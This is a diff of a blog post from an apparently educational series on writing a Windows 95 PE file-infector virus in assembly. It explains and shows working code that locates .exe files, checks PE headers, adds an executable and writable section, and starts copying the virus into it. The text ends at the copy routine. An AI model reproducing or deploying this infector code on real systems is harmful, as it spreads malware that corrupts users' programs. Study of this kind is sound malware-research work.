@@ -8,7 +8,7 @@ Welcome back! If this is your first visit to VeXation you may want to start by <
 
 # Objectives
 
-The first objective of a file infector is to add its own code to another file. In my case the files will be executables. The second objective of a file infector is to make sure the newly added virus code is run in addition to the original executable code. If the virus code isn't run it can't propagate to new executables. If the original executable code isn't run then the virus broke the program it infected and will probably be detected before spreading very far.
+The first objective of a file infector virus is to add its own code to another file. In my case the files will be executables. The second objective of a file infector is to make sure the newly added virus code is run in addition to the original executable code. If the virus code isn't run it can't propagate to new executables. If the original executable code isn't run then the virus broke the program it infected and will probably be detected before spreading very far.
 
 To make things manageable I started by focusing on the first objective: adding code to another executable. I prefer to work in small chunks where possible so I chose to break the task up as follows:
 
@@ -17,7 +17,7 @@ To make things manageable I started by focusing on the first objective: adding c
 1. Adding a new section to the target with the correct size and metadata.
 1. Writing the virus code into the new section of the target.
 
-As I introduce each topic at a high level I'll share some snippets of my assembly code so far. Towards the end I'll share the full assembly source code along with some pointers, and will share how I validated my work with some handy low level tools.
+As I introduce each topic at a high level I'll share some snippets of my assembly code so far. Towards the end I'll share the full assembly source code along with some pointers. Lastly I'll talk about how I validated my work with some handy low level tools.
 
 # Generation 0
 
@@ -27,13 +27,13 @@ Typically when you encounter a virus as an end user it's from running a benign p
 
 How was the generation 1 program infected? The author of the virus must have conspired to do this using what I call "Generation 0" - a program built to bootstrap the infection process. Unlike "Generation n" there is no benign functionality in generation 0, it exists only to infect.
 
-Having some terminology in mind was important because I found later on there were practical considerations to be made based on whether the code executing is generation 0 of the virus or a subsequent generation.
+Having some terminology in mind for this was important because I found later on there were practical considerations to be made based on whether the code executing is generation 0 of the virus or a subsequent generation.
 
 # Finding target .EXEs
 
 One of the classic problems of virus development is making sure that your creation doesn't escape the "lab" or destroy your development system. I imagine this was extra tricky before virtualization was easy. With the potential for disaster in mind I decided to start by only finding target executables to infect within the same directory as the generation 0 program. It isn't very difficult to recursively search other directories down the road.
 
-This simple infection strategy makes development easier. For example I wrote my [`Makefile`'s `run` target](https://github.com/cpu/vexation/blob/63dd691b18b26f56381b53878a2f1fa29bb047a7/minijector/Makefile#L46-L49) to copy a clean `calc.exe` from `C:\Windows` into the current directory before running the generation zero program, overwriting any previously infected versions in the process. I know the infection won't spread beyond the working directory and so everything is neatly contained.
+This simple infection strategy makes development easier. For example I wrote my [`Makefile`'s `run` target](https://github.com/cpu/vexation/blob/63dd691b18b26f56381b53878a2f1fa29bb047a7/minijector/Makefile#L46-L49) to copy a clean `calc.exe` from `C:\WINDOWS` into the current directory before running the generation 0 program, overwriting any previously infected versions in the process. I know the infection won't spread beyond the working directory and so everything is neatly contained.
 
 ```makefile{numberLines:true}
 run:: $(NAME).EXE
@@ -42,7 +42,7 @@ run:: $(NAME).EXE
    td32 $(NAME).EXE
 ```
 
-Finding target files requires using Win32 API functions. I found a copy of [`win32.hlp` for Windows 95](https://github.com/trietptm/OllyDbg-Archive/blob/master/HLP-Files/win32.hlp) that I use as my primary reference for the available Win32 APIs, their arguments and their return values. **Pay particular attention to API function return values!** Some API functions (e.g. `FindNextFileA`) return `0` for errors. Other API functions (e.g. `FindFirstFileA`) return something non-zero (`0xFFFFFFFF` for `FindFirstFileA`).
+Finding target files requires using Win32 API functions. I found a copy of [`win32.hlp` for Windows 95](https://github.com/trietptm/OllyDbg-Archive/blob/master/HLP-Files/win32.hlp) that I use as my primary reference for the available Win32 APIs, their arguments and their return values. **Pay particular attention to API function return values!** Some API functions (e.g. `FindNextFileA`) return zero for errors. Other API functions (e.g. `FindFirstFileA`) return something non-zero (e.g.`FindFirstFileA` returns `0xFFFFFFFF` on error).
 
 ![1995's API docs aren't so bad after all.](./win32.hlp.jpg)
 
@@ -51,13 +51,17 @@ To keep things simple I have been limiting my code to ASCII compatibility which 
 To find files in the current directory requires using a combination of [`FindFirstFileA`](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea) and [`FindNextFileA`](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findnextfilea). The first is used to start a directory traversal and the second is used to continue it. By providing a pointer to the null terminated string `"*.exe"` as the `lpFileName` I'm able to start a traversal of all executables (if any!) in the current directory.
 
 ```nasm{numberLines:true}
+; inputs:   `infectFilter` -> the pattern to find
+;           `findData`     -> the data structure to populate
+; outputs:  `targetFile`   -> the path to an .exe in the PWD to check
+;
 findfirst:
   mov eax, offset infectFilter
   mov ebx, offset findData
   call FindFirstFileA, eax, ebx
 
-  ; If we got an invalid handle from FindFirstFileA that means there were no EXEs
-  ; in the directory. Jump to error to handle this case
+  ; If we got an invalid handle from FindFirstFileA that means there were 
+  ; no EXEs in the directory. Jump to error to handle this case.
   cmp eax, INVALID_HANDLE_VALUE
   je error
   mov [findHandle], eax
@@ -128,9 +132,15 @@ There are two paths forward to read and write data from the file handle. Either 
 Memory mapping requires calling [`CreateFileMappingA`](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createfilemappinga) using the file handle from `CreateFileA` to get yet another handle, this time to a file mapping object. I was able to use the file mapping object handle with `MapViewOfFile` to map a specified portion of the underlying file into memory. The return value from this function is a pointer to the region of memory the file was mapped and it's possible to read and write from this region to access and change the file's contents.
 
 ```nasm{numberLines:true}
+; inputs:   `targetFile`       -> the path to an .exe in the PWD to check
+; outputs:  `targetFileHandle` -> handle to the target .exe
+;           `targetFileSize`   -> the target's filesize (lower bound)
+;           `targetMapHandle`  -> a handle to a memory map of the target .exe
+;           `targetP`          -> a pointer to the start of the memory map
+;
 mapfile:
-  ; Open a file handle to the targetFile. Use READ + WRITE so we can modify the
-  ; file easily if it turns out to be infectable.
+  ; Open a file handle to the targetFile. Use READ + WRITE so we can modify 
+  ; the file easily if it turns out to be infectable.
   mov eax, offset targetFile
   call CreateFileA, \
          eax,\                           ; file name
@@ -184,8 +194,8 @@ mapfile:
 With the file memory mapped it's possible to check whether it can be infected by examining key offsets within the DOS and PE headers. Initially when I was looking at example PE infector source code from this era I found most were using numeric offsets as magic numbers throughout the code. For example, here's one snippet I found that copies the file and section alignment from a PE header using numeric offsets:
 
 ```nasm{numberLines:true}
-;falignvalue will contain the FileAlignment
-;and salignvalue will contain the SectionAlignment
+; falignvalue will contain the FileAlignment
+; and salignvalue will contain the SectionAlignment
 mov eax, [ebx + 3Ch]
 mov [ebp + falignvalue], eax
 mov eax, [ebx + 38h]
@@ -195,18 +205,20 @@ mov [ebp + salignvalue], eax
 I'm not sure if this is because programmers were often ripping working assembly from viruses found in the wild missing source level context or if it was just how people did it at the time. Either way I found it made code that was difficult to 
 read.
 
-Life was much easier when I used my assembler's ability to define structures. TASM/MASM both support the `STRUCT` keyword for this. If there was a `STRUCT` for the PE header and its optional header then the section and file alignment fields could be accessed without using numeric offsets like `0x3C` and `0x38`:
+Life was much easier when I used my assembler's ability to define structures. `TASM`/`MASM` both support the `STRUCT` keyword for this. If there was a `STRUCT` for the PE header and its optional header then the section and file alignment fields could be accessed without using numeric offsets like `0x3C` and `0x38`:
 
 ```nasm{numberLines:true}
-;falignvalue will contain the FileAlignment
-;and salignvalue will contain the SectionAlignment
+; falignvalue will contain the FileAlignment
+; and salignvalue will contain the SectionAlignment
 mov eax, (IMAGE_NT_HEADERS [ebx]).OptionalHeader.FileAlignment
 mov [ebp + falignvalue], eax
 mov eax, (IMAGE_NT_HEADERS [ebx]).OptionalHeader.SectionAlignment
 mov [ebp + salignvalue], eax
 ```
 
-I found that the [MASM32 distribution](http://www.masm32.com/) came with a great `windows.inc` file that contained many predefined structure definitions, including the ones most important for PE manipulation: `IMAGE_DOS_HEADER` and `IMAGE_NT_HEADERS`. One thing I noticed was that the `windows.inc` field names didn't always match up to the PE docs exactly (e.g. `SecHdrVirtualAddress` vs `VirtualAddress`). The reason for this is because MASM (and TASM in compatibility mode) doesn't locally scope names within structs, meaning there can be only one structure field named `VirtualAddress` across all structs. If another struct needs a field for a similar purpose it can't use the same name and has to add a prefix (e.g. `SecHdr` for the section header).
+I found that the [MASM32 distribution](http://www.masm32.com/) came with a great `windows.inc` file that contained many predefined structure definitions, including the ones most important for PE manipulation: `IMAGE_DOS_HEADER` and `IMAGE_NT_HEADERS`. 
+
+One thing I noticed was that the `windows.inc` field names didn't always match up to the PE docs exactly (e.g. `SecHdrVirtualAddress` vs `VirtualAddress`). The reason for this is because `MASM` (and `TASM` in compatibility mode) doesn't locally scope names within `STRUCT`s, meaning there can be only one structure field named `VirtualAddress` across all `STRUCT`s. If another `STRUCT` needs a field for a similar purpose it can't use the same name and has to add a prefix (e.g. Using `SecHdr` for the section header `STRUCT` field because `Hdr` is already in use elsewhere).
 
 ![Example IMAGE_OPTIONAL_HEADERS struct](./image.optional.header.struct.jpg)
 
@@ -214,14 +226,22 @@ For this project I needed to check each target file for following things to deci
 
 1. There should be an `IMAGE_DOS_HEADER` [DOS MZ header](https://en.wikipedia.org/wiki/DOS_MZ_executable) at the very start of the file.
 1. The `e_lfanew` pointer from the `IMAGE_DOS_HEADER` should point to an `IMAGE_NT_HEADERS` PE header.
-1. The `IMAGE_NT_HEADERS`' `OptionalHeader`'s `Subsystem` field should be Windows GUI or Windows CUI (e.g. a graphical or command line Windows program).
-1. The `IMAGE_NT_HEADERS`' `FileHeader`'s `Machine` field should be i386.
-1. There shouldn't be an `IMAGE_SECTION_HEADER` present with the same name as the    virus code section (or it's already infected).
-1. There should be enough space for an additional `IMAGE_SECTION_HEADER` to be    added.
+1. The `IMAGE_NT_HEADERS`' `OptionalHeader`'s `Subsystem` field should be the value for the Windows GUI or Windows CUI subsystem (e.g. a graphical or command line Windows program).
+1. The `IMAGE_NT_HEADERS`' `FileHeader`'s `Machine` field should be the value for the `i386` architecture.
+1. There shouldn't be an `IMAGE_SECTION_HEADER` present with the same name as the virus code section present (or it's already infected).
+1. There should be enough space for an additional `IMAGE_SECTION_HEADER` to be added.
 
 ```nasm{numberLines:true}
+; inputs:   `targetP`        -> a pointer to the start of the memory mapped 
+;                               target .exe
+;           `targetFileSize` -> the size of the target .exe on disk (lower
+;                               bound)
+; outputs:  `eax`            -> pointer to the start of `IMAGE_NT_HEADERS` in
+;                               an infectable target .exe
+;
 ; With the target EXE mapped into memory we can start checking it out
 @@checkdosheader:
+  mov eax, [targetP]
   ; Check that we have a DOS header by looking for the IMAGE_DOS_SIGNATURE
   ; (the magic MZ bytes) at the expected offset
   cmp (IMAGE_DOS_HEADER [eax]).e_magic, IMAGE_DOS_SIGNATURE
@@ -286,53 +306,61 @@ At a high level adding a new section means:
 1. Calculating the correct `VirtualSize`, `SecHdrVirtualAddress`,    `SizeOfRawData` and `PointerToRawData` for the new `IMAGE_SECTION_HEADER`.
 1. Setting the correct `SecHdrCharacteristic` flag for the new    `IMAGE_SECTION_HEADER`.
 
-Increasing the `NumberOfSections` is self explanatory. Finding the end of the `IMAGE_SECTION_HEADERS` array requires some math. The start of this array is always immediately after the end of the base PE `IMAGE_NT_HEADERS` structure. I knew where the start of the PE structure is (the `e_lfanew` pointer from the `IMAGE_DOS_HEADER`) and I knew the size of the `IMAGE_NT_HEADERS` structure. That gives me the end of the PE structure and the start of the `IMAGE_SECTION_HEADER` array. I can calculate the offset to the end of the array as the number of sections (`NumberOfSections`) multiplied by the size of each `IMAGE_SECTION_HEADER` structure.
+Increasing the `NumberOfSections` is self explanatory. Finding the end of the `IMAGE_SECTION_HEADERS` array requires some math. The start of this array is always immediately after the end of the base PE `IMAGE_NT_HEADERS` structure. I knew where the start of the PE structure is (the `e_lfanew` pointer from the `IMAGE_DOS_HEADER`) and I knew the size of the `IMAGE_NT_HEADERS` structure. That gives me the end of the PE structure and the start of the `IMAGE_SECTION_HEADER` array. I can calculate the offset to the end of the array by multiplying `NumberOfSections` by the size of each `IMAGE_SECTION_HEADER` structure.
 
 ```nasm{numberLines:true}
-  ; Copy down how many sections the target PE has
-  mov cx, (IMAGE_NT_HEADERS [eax]).FileHeader.NumberOfSections
-  movzx ecx, cx
-  ; If there are zero sections, something is off, move on
-  cmp ecx, 0h
-  je findnext
-  ; Save the number of sections
-  mov [numberOfSections], ecx
+; inputs:   `eax`              -> pointer to the start of `IMAGE_NT_HEADERS`
+;                                 in the target .exe
+; outputs:  `numberOfSections` -> number of sections in the target .exe
+;           `segHeaders`       -> pointer to the start of the
+;                                `IMAGE_SECTION_HEADER`s in the target .exe
+;           `lastSegHeader`    -> pointer to the start of the last
+;                                `IMAGE_SECTION_HEADER` in the target .exe
+;
+; Copy down how many sections the target PE has
+mov cx, (IMAGE_NT_HEADERS [eax]).FileHeader.NumberOfSections
+movzx ecx, cx
+; If there are zero sections, something is off, move on
+cmp ecx, 0h
+je findnext
+; Save the number of sections
+mov [numberOfSections], ecx
 
-  ; Move ahead to the section table
-  add eax, size IMAGE_NT_HEADERS
+; Move ahead to the section table
+add eax, size IMAGE_NT_HEADERS
 
-  ; Check that the pointer is still within the file size
-  mov ecx, eax
-  sub ecx, [targetP]
-  cmp ecx, [targetFileSize]
-  jge findnext
+; Check that the pointer is still within the file size
+mov ecx, eax
+sub ecx, [targetP]
+cmp ecx, [targetFileSize]
+jge findnext
 
-  ; Check that the last segment specified is within the file size
-  mov ecx, [numberOfSections]
-  mov edx, size IMAGE_SECTION_HEADER
-  imul ecx, edx
-  mov ebx, eax
-  add ebx, ecx
-  sub ebx, [targetP]
-  cmp ebx, [targetFileSize]
-  jge findnext
+; Check that the last segment specified is within the file size
+mov ecx, [numberOfSections]
+mov edx, size IMAGE_SECTION_HEADER
+imul ecx, edx
+mov ebx, eax
+add ebx, ecx
+sub ebx, [targetP]
+cmp ebx, [targetFileSize]
+jge findnext
 
-  ; Save the location of the first section header
-  mov [segHeaders], eax
+; Save the location of the first section header
+mov [segHeaders], eax
 
-  ; The last segment header should be at an offset:
-  ;   sizeof IMAGE_SECTION_HEADER * numberOfSections - 1
-  mov ecx, [numberOfSections]
-  dec ecx
-  mov edx, size IMAGE_SECTION_HEADER
-  imul ecx, edx
+; The last segment header should be at an offset:
+;   sizeof IMAGE_SECTION_HEADER * numberOfSections - 1
+mov ecx, [numberOfSections]
+dec ecx
+mov edx, size IMAGE_SECTION_HEADER
+imul ecx, edx
 
-  ; Its an RVA from targetP so offset by eax
-  mov edx, eax
-  add ecx, edx
+; Its an RVA from targetP so offset by eax
+mov edx, eax
+add ecx, edx
 
-  ; Store the location of the last segment header
-  mov [lastSegHeader], ecx
+; Store the location of the last segment header
+mov [lastSegHeader], ecx
 ```
 
 Having to calculate two sizes (`VirtualSize`, and `SizeOfRawData`) and two offsets (`SecHdrVirtualAddress` and `PointerToRawData`) for the section header metadata may seem strange at first. The duplication is more understandable when put in context. PE sections describe something that exists both on disk, and eventually [once loaded by the OS](https://en.wikipedia.org/wiki/Loader_%28computing%29), in memory. These two contexts have different requirements. As one example on disk it's beneficial for code to be aligned to suit the filesystem. In memory it's beneficial for code to be aligned to suit memory pages. Having one format that can describe both the "virtual" (in memory) and the "physical/raw" (on disk) makes sense and allows for a lot of flexibility.
@@ -347,7 +375,7 @@ By placing a label (`viral_payload`) at the very start of the virus code I could
 viral_payload_size EQU $ - viral_payload
 ```
 
-This equate stayed current as I tweaked the code and avoided having to update a fixed value. The unoptimized assembly linked to later in this post ends up having `viral_payload_size EQU 38Eh`, a pretty beefy `910` bytes.
+This equate stayed current as I tweaked the code and avoided having to update a fixed value. The unoptimized assembly linked to later in this post ends up having `viral_payload_size EQU 38Eh`, a pretty beefy `910` bytes (`0x038E` == `910`).
 
 Aligning the virtual and raw sections according to the required alignment sounds difficult but is just a way of saying that the unaligned size must be made evenly divisible by the alignment value. The calculation is:
 
@@ -355,18 +383,18 @@ Aligning the virtual and raw sections according to the required alignment sounds
 (((originalSize - 1) / alignment) + 1) * alignment
 ```
 
-A typical value for the PE optional header section alignment is `0x1000`, so the adjusted `VirtualSize` of the new section assuming the `viral_payload_size` is `0x38E` is:
+A typical value for the PE optional header section alignment is `0x1000`, so the adjusted `VirtualSize` of the new section assuming the `viral_payload_size` is `0x038E` is:
 
 ```nasm
-VirtualSize = (((0x38E - 0x1) / 0x1000) + 0x1) * 0x1000 
+VirtualSize = (((0x038E - 0x1) / 0x1000) + 0x1) * 0x1000 
             = 0x1000 = 4096
 ```
 
-For the `SizeOfRawData` a typical file alignment value is `0x200`, so the calculation is:
+For the `SizeOfRawData` a typical file alignment value is `0x0200`, so the calculation is:
 
 ```nasm
-SizeOfRawData = (((0x38E - 0x1) / 0x200) + 0x1) * 0x200 
-              = 0x400 = 1024
+SizeOfRawData = (((0x038E - 0x1) / 0x0200) + 0x1) * 0x0200 
+              = 0x0400 = 1024
 ```
 
 In both cases you can see the aligned size ends up larger than the original virus size. The extra space in the file and in memory will be empty padding and that's why file infectors often find the space they need in existing executable segments.
@@ -378,65 +406,81 @@ Similar to the `SecHdrVirtualAddress`, the `PointerToRawData` value is an RVA th
 The last part was setting the `SecHdrCharacteristics` flag. The new section contains code and should be executable and readable. In the future I know I'll want the virus code to be able to modify parts of its own section so I also wanted the section to be writable. All told this meant the flag value was the combination of the `IMAGE_SCN_MEM_READ`, `IMAGE_SCN_MEM_WRITE`, `IMAGE_SCN_MEM_EXECUTE` and `IMAGE_SCN_CNT_CODE` bitmasks.
 
 ```nasm{numberLines:true}
-  ; Fix the VirtualSize, ensuring its a multiple of the section alignment
-  mov eax, viral_payload_size
-  sub eax, 1
-  xor edx, edx
-  div [sectionAlignment]
-  add eax, 1
-  mul [sectionAlignment]
-  mov (IMAGE_SECTION_HEADER [edi]).VirtualSize, eax
+; inputs:   `viral_payload_size` -> unpadded virus code size
+;           `sectionAlignment`   -> section alignment specified in the target 
+;                                   .exe PE `OPTIONAL_HEADER`
+;           `fileAlignment`      -> file alignment specified in the target
+;                                   .exe PE `OPTIONAL_HEADER`
+;           `edi`                -> pointer to start of new virus 
+;                                  `IMAGE_SECTION_HEADER`
+;           `targetP`            -> pointer to the start of target .exe 
+;                                   memory map
+;           `numberOfSections`   -> number of sections in target .exe
+;
+; outputs:  `injectStart`        -> pointer to the start of the added virus code 
+;                                   section data.
+;           `injectSize`         -> the size of the new raw section data.
+;
+;
+; Fix the VirtualSize, ensuring its a multiple of the section alignment
+mov eax, viral_payload_size
+sub eax, 1
+xor edx, edx
+div [sectionAlignment]
+add eax, 1
+mul [sectionAlignment]
+mov (IMAGE_SECTION_HEADER [edi]).VirtualSize, eax
 
-  ; Fix the virtual address, again ensuring section alignment
-  mov ecx, [lastSegHeader]
-  mov eax, (IMAGE_SECTION_HEADER [ecx]).VirtualSize
-  mov ecx, (IMAGE_SECTION_HEADER [ecx]).SecHdrVirtualAddress
-  add eax, ecx
-  sub eax, 1
-  xor edx, edx
-  div [sectionAlignment]
-  add eax, 1
-  mul [sectionAlignment]
-  mov [edi].SecHdrVirtualAddress, eax
+; Fix the virtual address, again ensuring section alignment
+mov ecx, [lastSegHeader]
+mov eax, (IMAGE_SECTION_HEADER [ecx]).VirtualSize
+mov ecx, (IMAGE_SECTION_HEADER [ecx]).SecHdrVirtualAddress
+add eax, ecx
+sub eax, 1
+xor edx, edx
+div [sectionAlignment]
+add eax, 1
+mul [sectionAlignment]
+mov [edi].SecHdrVirtualAddress, eax
 
-  ; Back at the start of the PE file fix the section count by incrementing it
-  mov ecx, [targetP]
-  add ecx, (IMAGE_DOS_HEADER [ecx]).e_lfanew
-  mov eax, [numberOfSections]
-  inc eax
-  ; Write the updated number of sections
-  mov (IMAGE_NT_HEADERS [ecx]).FileHeader.NumberOfSections, ax
+; Back at the start of the PE file fix the section count by incrementing it
+mov ecx, [targetP]
+add ecx, (IMAGE_DOS_HEADER [ecx]).e_lfanew
+mov eax, [numberOfSections]
+inc eax
+; Write the updated number of sections
+mov (IMAGE_NT_HEADERS [ecx]).FileHeader.NumberOfSections, ax
 
-  ; Fix the raw data size, ensuring it is a multiple of the file alignment
-  mov eax, viral_payload_size
-  sub eax, 1
-  xor edx, edx
-  div [fileAlignment]
-  add eax, 1
-  mul [fileAlignment]
-  mov (IMAGE_SECTION_HEADER [edi]).SizeOfRawData, eax
+; Fix the raw data size, ensuring it is a multiple of the file alignment
+mov eax, viral_payload_size
+sub eax, 1
+xor edx, edx
+div [fileAlignment]
+add eax, 1
+mul [fileAlignment]
+mov (IMAGE_SECTION_HEADER [edi]).SizeOfRawData, eax
 
-  ; Fix the raw data pointer - this should point to the beginning of the
-  ; new section, which is located right after the end of the current last
-  ; section. Adding the last section's PointerToRawData (the start of the
-  ; last section) to SizeOfRawData gives us this address.
-  mov ebx, [lastSegHeader]
-  mov eax, (IMAGE_SECTION_HEADER [ebx]).PointerToRawData
-  add eax, (IMAGE_SECTION_HEADER [ebx]).SizeOfRawData
-  mov (IMAGE_SECTION_HEADER [edi]).PointerToRawData, eax
+; Fix the raw data pointer - this should point to the beginning of the
+; new section, which is located right after the end of the current last
+; section. Adding the last section's PointerToRawData (the start of the
+; last section) to SizeOfRawData gives us this address.
+mov ebx, [lastSegHeader]
+mov eax, (IMAGE_SECTION_HEADER [ebx]).PointerToRawData
+add eax, (IMAGE_SECTION_HEADER [ebx]).SizeOfRawData
+mov (IMAGE_SECTION_HEADER [edi]).PointerToRawData, eax
 
-  ; Save the pointer to raw data and the size of the raw data
-  mov eax, (IMAGE_SECTION_HEADER [edi]).PointerToRawData
-  mov [injectStart], eax
-  mov eax, (IMAGE_SECTION_HEADER [edi]).SizeOfRawData
-  mov [injectSize], eax
+; Save the pointer to raw data and the size of the raw data
+mov eax, (IMAGE_SECTION_HEADER [edi]).PointerToRawData
+mov [injectStart], eax
+mov eax, (IMAGE_SECTION_HEADER [edi]).SizeOfRawData
+mov [injectSize], eax
 
-  ; Fix the section flags. Notably we want this to be both EXECUTE and WRITE
-  mov ecx, IMAGE_SCN_MEM_READ + \
-           IMAGE_SCN_MEM_WRITE + \
-           IMAGE_SCN_MEM_EXECUTE + \
-           IMAGE_SCN_CNT_CODE
-  mov (IMAGE_SECTION_HEADER [edi]).SecHdrCharacteristics, ecx
+; Fix the section flags. Notably we want this to be both EXECUTE and WRITE
+mov ecx, IMAGE_SCN_MEM_READ + \
+         IMAGE_SCN_MEM_WRITE + \
+         IMAGE_SCN_MEM_EXECUTE + \
+         IMAGE_SCN_CNT_CODE
+mov (IMAGE_SECTION_HEADER [edi]).SecHdrCharacteristics, ecx
 ```
 
 # Writing the virus code into the new section
@@ -446,30 +490,42 @@ The last trick I needed to perform is to expand the target's overall file size. 
 Increasing the file size turns out to be pretty easy and only required remaping the file using `CreateFileMappingA` and `MapViewOfFile` again, adjusting the arguments to account for the new space. Because I'm modifying a PE file on disk I need to adjust by the new section's `SizeOfRawData` not the original unpadded size or the `VirtualSize`.
 
 ```nasm{numberLines:true}
-  ; Calculate the new size we should map. This is the old file size + 
-  ; the size of the new section on-disk
-  mov eax, [targetFileSize]
-  mov ecx, [injectSize]
-  add eax, ecx
-  mov ebx, [targetFileHandle]
+; inputs:   `targetFileSize`   -> the original .exe size on disk (lower bound)
+;           `injectSize`       -> the size of the new virus section's raw data
+;           `targetFileHandle` -> handle to the target .exe file
+;
+; outputs:  `targetMapHandle`  -> an updated memory map handle for the target 
+;                                 .exe file updated to the new size.
+;
+; Calculate the new size we should map. This is the old file size + 
+; the size of the new section on-disk
+mov eax, [targetFileSize]
+mov ecx, [injectSize]
+add eax, ecx
+mov ebx, [targetFileHandle]
 
-  ; Memory map the target PE file again with this new size
-  call CreateFileMappingA, \
-         ebx,\                 ; file handle
-         0h,\                  ; sec attributes (not used for win95)
-         PAGE_READWRITE,\      ; r/w attributes
-         0h,\                  ; flProtect (??)
-         eax,\                 ; high size (adjusted filesize)
-         0h                    ; low size
-  cmp eax, 0h
-  je error
-  ; Save a handle to the new memory map
-  mov [targetMapHandle], eax
+; Memory map the target PE file again with this new size
+call CreateFileMappingA, \
+       ebx,\                 ; file handle
+       0h,\                  ; sec attributes (not used for win95)
+       PAGE_READWRITE,\      ; r/w attributes
+       0h,\                  ; flProtect (??)
+       eax,\                 ; high size (adjusted filesize)
+       0h                    ; low size
+cmp eax, 0h
+je error
+; Save a handle to the new memory map
+mov [targetMapHandle], eax
 ```
 
 After the enlarged view of the file is mapped it was just a matter of copying the generation 0 code that is currently executing from memory into the new section. For this I used a fun bit of self-referential code that relies on the `viral_payload` label and the new `SizeOfRawData` to know where to begin copying from and how many bytes to copy.
 
 ```nasm{numberLines:true}
+; inputs:   `injectStart`   -> the start of the new virus section's raw data
+;           `injectSize`    -> the size of the new virus section's raw data
+;           `eax`           -> the `targetP` pointer to the start of the .exe 
+;                              memory map
+;
 ; Time to write the new section content with our own code
 @@startcopyviruscode:
   ; Destination: the start of our section in targetP
